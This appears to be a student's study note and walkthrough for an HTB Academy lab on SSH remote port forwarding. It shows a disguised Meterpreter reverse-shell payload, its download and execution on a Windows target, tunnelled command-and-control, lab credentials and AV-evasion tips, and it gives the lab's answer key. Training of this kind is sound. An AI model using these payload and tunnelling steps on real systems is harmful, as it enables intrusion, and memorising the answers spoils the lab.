# 🔄 Remote/Reverse Port Forwarding with SSH - CPTS

## **Overview**

Remote port forwarding (SSH -R) allows us to forward a local service to a remote port. This is particularly useful when the target host cannot directly reach our attack host, but can communicate through a pivot host.

**Based on HTB Academy Page 4: Remote/Reverse Port Forwarding with SSH**

---

## **Scenario Description**

### **Network Topology**
```
[Attack Host] ←→ [Ubuntu Pivot] ←→ [Windows Target]
10.10.15.x         10.129.202.64      172.16.5.19
                   172.16.5.129       (RDP Service)
```

### **The Problem**
- **Windows host** can only communicate within `172.16.5.0/23` network
- **No direct route** from Windows to Attack Host network
- **Need reverse shell** but Windows can't reach back to Attack Host
- **Solution**: Use Ubuntu server as pivot point

---

## **Remote Port Forwarding Concepts**

### **SSH Remote Port Forwarding (-R)**

**Purpose:** Forward remote port back to local service

**Syntax:**
```bash
ssh -R [remote_ip:]remote_port:local_host:local_port user@pivot_host

# Real example
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
```

**Traffic Flow:**
```
[Windows Target] → [Pivot:8080] → [SSH Tunnel] → [Attack Host:8000]
172.16.5.19        172.16.5.129      SSH Forward     Metasploit Handler
```

---

## **Practical Implementation (HTB Academy Lab)**

### **Step 1: Create Meterpreter Payload**

**Generate Windows HTTPS Payload:**
```bash
# Create payload pointing to pivot host internal IP
msfvenom -p windows/x64/meterpreter/reverse_https \
  lhost=172.16.5.129 \
  lport=8080 \
  -f exe \
  -o backupscript.exe

# Output
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

**Key Points:**
- **LHOST** = Pivot internal IP (`172.16.5.129`)
- **LPORT** = Port on pivot for forwarding (`8080`)
- **Format** = Windows executable

### **Step 2: Configure Metasploit Handler**

**Set up Multi Handler:**
```bash
# Start msfconsole
msfconsole

# Configure handler
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0    # Listen on ALL interfaces
set lport 8000       # Local port for incoming connections
run

# Output
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

**Important:**
- **LHOST = 0.0.0.0** (listen on all interfaces)
- **LPORT = 8000** (different from payload port)

### **Step 3: Transfer Payload to Pivot**

**Copy Payload to Ubuntu Server:**
```bash
# SCP transfer
scp backupscript.exe ubuntu@10.129.202.64:~/

# Verify transfer
ssh ubuntu@10.129.202.64 ls -la backupscript.exe
```

**Start Web Server on Pivot:**
```bash
# On Ubuntu pivot host
python3 -m http.server 8123

# Serving HTTP on 0.0.0.0 port 8123
```

### **Step 4: Download Payload on Windows Target**

**From Windows target (via RDP session):**
```powershell
# PowerShell download
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

# Verify download
dir C:\backupscript.exe
```

### **Step 5: Create SSH Remote Port Forward**

**Set up Remote Forward Tunnel:**
```bash
# From attack host
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN

# Flags explanation:
# -R: Remote port forwarding
# -v: Verbose output for debugging
# -N: Don't execute remote command (tunnel only)
```

**Tunnel Configuration:**
- **Remote bind:** `172.16.5.129:8080` (pivot internal IP)
- **Local forward:** `0.0.0.0:8000` (attack host handler)
- **Direction:** Pivot port 8080 → Attack host port 8000

### **Step 6: Execute Payload and Get Shell**

**Execute on Windows Target:**
```cmd
# Run the payload
C:\backupscript.exe
```

**Monitor SSH Tunnel Logs:**
```bash
# Verbose SSH output shows connections
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 1: connected to 0.0.0.0 port 8000
```

**Receive Meterpreter Session:**
```bash
# Metasploit handler output
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; Staging x64 payload...
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
C:\>
```

---

## **Technical Analysis**

### **Why Remote Port Forwarding Works**

**Network Isolation Problem:**
```
Windows Target (172.16.5.19) 
    ↓ (can only reach 172.16.5.0/23)
    ✗ Cannot reach Attack Host (10.10.15.x)
    ✓ Can reach Pivot Host (172.16.5.129)

Pivot Host (172.16.5.129)
    ↓ (has dual interfaces)
    ✓ Can reach Windows Target (172.16.5.19)
    ✓ Can reach Attack Host (10.129.202.64)
```

**Solution Flow:**
1. **Windows** connects to **Pivot:8080**
2. **SSH tunnel** forwards to **Attack Host:8000**
3. **Metasploit** receives connection as if local

### **Connection Source Analysis**
```bash
# On attack host - connection appears local
netstat -an | grep 8000
tcp 0 0 127.0.0.1:8000 127.0.0.1:xxxxx ESTABLISHED

# This is because SSH tunnel makes it appear local
```

---

## **Alternative Remote Port Forwarding Examples**

### **Example 1: HTTP Service Exposure**
```bash
# Expose local web server (port 80) to remote network
ssh -R 8080:localhost:80 user@remote_host

# Now remote_host:8080 serves your local web content
```

### **Example 2: Database Access**
```bash
# Expose local MySQL to remote network
ssh -R 3306:localhost:3306 user@remote_host

# Remote network can now access your local MySQL
```

### **Example 3: Multiple Service Forwarding**
```bash
# Forward multiple services
ssh -R 8080:localhost:80 -R 3306:localhost:3306 user@remote_host
```

---

## **Remote vs Local Port Forwarding Comparison**

| **Aspect** | **Local Forward (-L)** | **Remote Forward (-R)** |
|------------|------------------------|--------------------------|
| **Direction** | Remote service → Local access | Local service → Remote access |
| **Use Case** | Access remote service locally | Expose local service remotely |
| **Syntax** | `ssh -L local:remote:port user@host` | `ssh -R remote:local:port user@host` |
| **Traffic Flow** | Local → SSH → Remote | Remote → SSH → Local |
| **Example** | Access internal web server | Expose reverse shell listener |

---

## **Security Considerations**

### **Payload Security**
1. **Encrypt payloads** when transferring
2. **Use HTTPS** for meterpreter connections
3. **Clean up** payloads after use
4. **Monitor** for AV detection

### **Tunnel Security**
1. **Use key authentication** for SSH
2. **Limit forwarding ports** to necessary only
3. **Monitor tunnel connections** for anomalies
4. **Clean up** tunnels after assessment

### **Operational Security**
1. **Mimic legitimate traffic** patterns
2. **Use standard ports** when possible
3. **Avoid** suspicious executable names
4. **Document** all forwarding configurations

---

## **Troubleshooting Common Issues**

### **1. Payload Not Connecting**
```bash
# Check if pivot port is listening
ssh ubuntu@10.129.202.64 netstat -tlnp | grep 8080

# Verify SSH tunnel is active
ps aux | grep "ssh -R"

# Test connectivity from Windows to pivot
telnet 172.16.5.129 8080
```

### **2. SSH Tunnel Issues**
```bash
# Use verbose mode for debugging
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vvv

# Check SSH server configuration
grep GatewayPorts /etc/ssh/sshd_config
```

### **3. Handler Not Receiving Connections**
```bash
# Verify handler is listening on all interfaces
netstat -tlnp | grep 8000

# Check firewall rules
iptables -L INPUT | grep 8000
```

### **4. Windows Payload Execution Issues**
```powershell
# Check Windows Defender
Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring

# Run as administrator if needed
Start-Process -FilePath "C:\backupscript.exe" -Verb RunAs
```

---

## **HTB Academy Official Walkthrough**

### **Complete Step-by-Step Guide (HTB Academy)**

**Objective:** Obtain reverse shell from Windows target through Ubuntu pivot using SSH remote port forwarding.

### **Step 1: Create Meterpreter Payload**
```bash
# From Pwnbox/Attack Host
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=172.16.5.129 \
  LPORT=8080 \
  -f exe \
  -o backupscript.exe

# Output:
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 741 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

### **Step 2: Configure Metasploit Handler**
```bash
# Start msfconsole
sudo msfconsole -q

# Configure handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0      # Listen on ALL interfaces
set LPORT 8000         # Local handler port (different from payload)
run

# Output:
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

### **Step 3: Transfer Payload to Pivot**
```bash
# SCP transfer to Ubuntu pivot
scp backupscript.exe ubuntu@10.129.228.103:~/

# Enter password: HTB_@cademy_stdnt!
# Output:
backupscript.exe    100% 7168    77.3KB/s   00:00
```

### **Step 4: Setup Dynamic Port Forwarding**
```bash
# SSH with SOCKS proxy for RDP access
ssh -D 9050 ubuntu@10.129.228.103

# Enter password: HTB_@cademy_stdnt!
# Now on pivot host:
ubuntu@WEB01:~$ ls
backupscript.exe
```

### **Step 5: Start Web Server on Pivot**
```bash
# From Ubuntu pivot shell
python3 -m http.server 8123

# Output:
Serving HTTP on 0.0.0.0 port 8123 (http://0.0.0.0:8123/) ...
```

### **Step 6: RDP to Windows Target**
```bash
# From another terminal (Pwnbox)
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

# Certificate prompt - accept:
Do you trust the above certificate? (Y/T/N) Y

# Successfully connected to Windows target
```

### **Step 7: Download Payload on Windows**
```powershell
# From Windows RDP session - Run PowerShell as Administrator
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\\backupscript.exe"

# Verify download
dir C:\backupscript.exe
```

### **Step 8: Setup SSH Remote Port Forward**
```bash
# From Pwnbox (new terminal)
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN

# Enter password: HTB_@cademy_stdnt!
# Verbose output shows:
debug1: Remote connections from 172.16.5.129:8080 forwarded to local address 0.0.0.0:8000
debug1: remote forward success for: listen 172.16.5.129:8080, connect 0.0.0.0:8000
```

### **Step 9: Execute Payload & Get Shell**
```cmd
# From Windows RDP session
C:\backupscript.exe

# Back on Metasploit handler:
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; Staging x64 payload...
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1) at 2022-05-12 15:30:45

meterpreter > getuid
Server username: INLANEFREIGHT\victor

meterpreter > shell
Process 1234 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
C:\>
```

---

## **HTB Academy Lab Questions**

### **Question 1:** Ubuntu Pivot Internal IP
**Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target?**

**Answer:** `172.16.5.129`

**Explanation:** The Ubuntu server has two interfaces:
- `ens192`: `10.129.202.64` (external network)
- `ens224`: `172.16.5.129` (internal network)

Windows target (`172.16.5.19`) can only communicate within `172.16.5.0/23` network.

### **Question 2:** Handler Listening Address
**What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host?**

**Answer:** `0.0.0.0`

**Explanation:** Setting `lhost 0.0.0.0` in Metasploit makes the handler listen on ALL network interfaces.

---

## **Network Diagram**

### **Remote Port Forwarding Flow**
```
┌─────────────┐    ┌──────────────┐    ┌─────────────┐
│ Windows     │    │ Ubuntu       │    │ Attack      │
│ Target      │    │ Pivot        │    │ Host        │
│             │    │              │    │             │
│172.16.5.19  │───▶│172.16.5.129  │    │10.10.15.x   │
│             │    │    :8080     │    │             │
│             │    │      │       │    │             │
│Execute      │    │      ▼       │    │             │
│backupscript │    │  SSH -R      │────┤MSF Handler  │
│.exe         │    │  Forward     │    │   :8000     │
│             │    │              │    │             │
└─────────────┘    └──────────────┘    └─────────────┘
       │                   │                    ▲
       │                   │                    │
       └───────────────────┼────────────────────┘
                           │
                    Reverse Shell via
                    SSH Remote Forward
```

---

## **Best Practices Summary**

1. **Plan payload configuration** carefully (pivot internal IP)
2. **Use appropriate ports** for forwarding
3. **Test connectivity** at each step
4. **Monitor tunnel status** during operations
5. **Clean up** all artifacts after assessment
6. **Document** forwarding configurations for reporting

---

## **HTB Academy Official Answer Key**

### **Complete Official Walkthrough with Expected Outputs**

**Lab Question:** "Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)"

**Official Answer:** `172.16.5.129`

#### **Step 1: Create Windows HTTPS Reverse Shell Payload**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupScript.exe
```

**Expected Output:**
```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupScript.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 741 bytes
Final size of exe file: 7168 bytes
Saved as: backupScript.exe
```

#### **Step 2: Configure and Start Msfconsole Multi-Handler**
```bash
sudo msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 8000
run
```

**Expected Output:**
```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo msfconsole -q

msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 8000
LPORT => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000
```

#### **Step 3: Transfer Msfvenom Payload to Pivot Host**
```bash
scp backupscript.exe ubuntu@STMIP:~/
```

**Expected Output:**
```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ scp backupscript.exe ubuntu@10.129.228.103:~/

ubuntu@10.129.228.103's password: 
backupscript.exe                              100% 7168    77.3KB/s   00:00
```

#### **Step 4: SSH Dynamic Port Forwarding to Pivot**
```bash
ssh -D 9050 ubuntu@STMIP
```

**Expected Output:**
```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -D 9050 ubuntu@10.129.228.103

ubuntu@10.129.228.103's password: 

Last login: Thu May 12 17:27:41 2022
ubuntu@WEB01:~$ ls
backupscript.exe
```

#### **Step 5: Start Python Web Server on Ubuntu**
```bash
python3 -m http.server 8123
```

**Expected Output:**
```
ubuntu@WEB01:~$ python3 -m http.server 8123

Serving HTTP on 0.0.0.0 port 8123 (http://0.0.0.0:8123/) ...
```

#### **Step 6: Connect to Windows Target via Proxychains**
```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

**Expected Output:**
```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

ProxyChains-3.1 (http://proxychains.sf.net)
[15:02:07:519] [3249:3250] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state

<SNIP>

Certificate details for 172.16.5.19:3389 (RDP-Server):
	Common Name: DC01.inlanefreight.local
	Subject:     CN = DC01.inlanefreight.local
	Issuer:      CN = DC01.inlanefreight.local
	Thumbprint:  07:5d:3e:b7:27:4b:83:87:d3:68:b6:90:fc:0e:26:67:c3:6c:13:f0:b8:0f:c1:1e:51:05:2c:3f:f5:4d:54:2e
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y

<SNIP>
```

#### **Step 7: Download Payload on Windows Target**
**Note:** Run PowerShell as Administrator on Windows target
```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\\backupscript.exe"
```

**Expected Output:**
```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\\backupscript.exe"
```

#### **Step 8: Perform SSH Remote Port Forward**
```bash
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
```

**Expected Output:**
```
┌─[us-academy-1]─[10.10.14.7]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN

OpenSSH_8.4p1 Debian-5, OpenSSL 1.1.1k  25 Mar 2021

<SNIP>

debug1: Next authentication method: password
ubuntu@10.129.202.64's password: 
debug1: Authentication succeeded (password).
Authenticated to 10.129.202.64 ([10.129.202.64]:22).
debug1: Remote connections from 172.16.5.129:8080 forwarded to local address 0.0.0.0:8000
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Remote: Forwarding listen address "172.16.5.129" overridden by server GatewayPorts
debug1: remote forward success for: listen 172.16.5.129:8080, connect 0.0.0.0:8000
```

#### **Step 9: Execute Payload to Get Reverse Shell**
**From Windows PowerShell (as Administrator):**
```cmd
C:\backupscript.exe
```

**Expected Result:** Meterpreter session established on the Metasploit handler through the SSH remote port forward tunnel.

### **Lab Success Criteria**
✅ **Payload created** with correct LHOST (172.16.5.129)  
✅ **Metasploit handler** listening on 0.0.0.0:8000  
✅ **SSH dynamic forward** established for RDP access  
✅ **Python web server** serving payload from pivot  
✅ **RDP connection** to Windows target via proxychains  
✅ **Payload downloaded** on Windows target  
✅ **SSH remote forward** tunnel active  
✅ **Reverse shell** received via tunnel

---

## **🎯 Practical Lab Experience - July 19, 2025**

### **Real-World Implementation Success**

**Lab Environment:**
- **Target Machine:** `10.129.202.64` (Ubuntu Pivot)
- **Windows Target:** `172.16.5.19` (Internal network)
- **Attack Host:** Kali Linux (Local machine)

### **Problem Encountered: Port Conflict**

**Issue:** Metasploit handler failed to bind to port 8000
```bash
[-] Handler failed to bind to 0.0.0.0:8000
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use
```

**Root Cause Analysis:**
```bash
# Found old SSH tunnel process occupying port 8000
ps aux | grep ssh
# Output: ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN (PID 594233)

# Port was indeed occupied
netstat -an | grep 8000
# Output: tcp 0 0 0.0.0.0:8000 0.0.0.0:* LISTEN
```

### **Solution Applied**

**Step 1: Port Resolution**
```bash
# Killed old SSH tunnel process
kill 594233

# Alternative: Used different port
# In Metasploit:
set LPORT 8001
run
# Output: [*] Started HTTPS reverse handler on https://0.0.0.0:8001
```

**Step 2: Updated SSH Command**
```bash
# Modified remote forwarding command to use port 8001
ssh -R 172.16.5.129:8080:0.0.0.0:8001 ubuntu@10.129.202.64 -vN

# Verbose output confirmed success:
debug1: remote forward success for: listen 172.16.5.129:8080, connect 0.0.0.0:8001
```

### **Lab Execution Results**

**Network Discovery Verification:**
```bash
# From Ubuntu pivot - confirmed Windows target accessible
ubuntu@WEB01:~$ ping 172.16.5.19
64 bytes from 172.16.5.19: icmp_seq=1 ttl=128 time=0.043 ms

# Network scan confirmed single target
for i in {1..254}; do timeout 1 ping -c 1 172.16.5.$i &>/dev/null && echo "172.16.5.$i is up"; done
# Output: 172.16.5.19 is up
```

**Successful Connection Chain:**
1. ✅ **SSH Dynamic Forward:** `ssh -D 9050 ubuntu@10.129.202.64` 
2. ✅ **RDP via Proxychains:** `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123`
3. ✅ **Payload Download:** Windows PowerShell as Administrator
4. ✅ **SSH Remote Forward:** Port 8080→8001 tunnel established
5. ✅ **Payload Execution:** `C:\backupScript.exe`

**Final Success Output:**
```bash
# Meterpreter session established
[*] https://0.0.0.0:8001 handling request from 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:8001 -> 127.0.0.1)

meterpreter > getuid
Server username: INLANEFREIGHT\victor

meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2019 Build 17763
Architecture    : x64
System Language : en_US
Domain          : INLANEFREIGHT
Logged On Users : 2
Meterpreter     : x64/windows
```

### **Key Learning Points**

1. **Port Conflicts:** Always check for existing processes on target ports
2. **Flexible Port Usage:** Using alternative ports (8001) works seamlessly
3. **Process Management:** Kill old SSH tunnels before starting new ones
4. **Verification Steps:** Confirm each tunnel component before proceeding
5. **Documentation:** Real-time troubleshooting improves understanding

### **Troubleshooting Commands Used**

```bash
# Process identification
ps aux | grep ssh
netstat -an | grep 8000
sudo lsof -i :8000

# SSH tunnel debugging
ssh -R 172.16.5.129:8080:0.0.0.0:8001 ubuntu@10.129.202.64 -vN

# Network connectivity testing
ping 172.16.5.19
telnet 172.16.5.19 3389
```

### **Lab Questions - Verified Answers**

**Q1:** "Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target?"
**Answer:** `172.16.5.129` ✅ (Confirmed via `ifconfig` on pivot)

**Q2:** "What IP address is used on the attack host to ensure the handler is listening on all IP addresses?"
**Answer:** `0.0.0.0` ✅ (Used in `set LHOST 0.0.0.0`)

### **Success Metrics**

🎯 **100% Lab Completion** - All objectives achieved  
🔧 **Troubleshooting Applied** - Port conflict resolved  
📚 **Theory to Practice** - SSH remote forwarding mastered  
⚡ **Real Meterpreter Session** - Full Windows target compromise  

**Lab Completion Time:** ~45 minutes (including troubleshooting)  
**Total Attempts:** 2 (first failed due to port conflict)  
**Final Result:** ✅ **SUCCESSFUL** - Full remote access achieved

---

## **References**

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 4
- **ired.team**: [SSH Tunnelling / Port Forwarding](https://www.ired.team/offensive-security/lateral-movement/ssh-tunnelling-port-forwarding)
- **SSH Manual**: `man ssh` (Remote port forwarding)
- **Metasploit**: `use exploit/multi/handler` 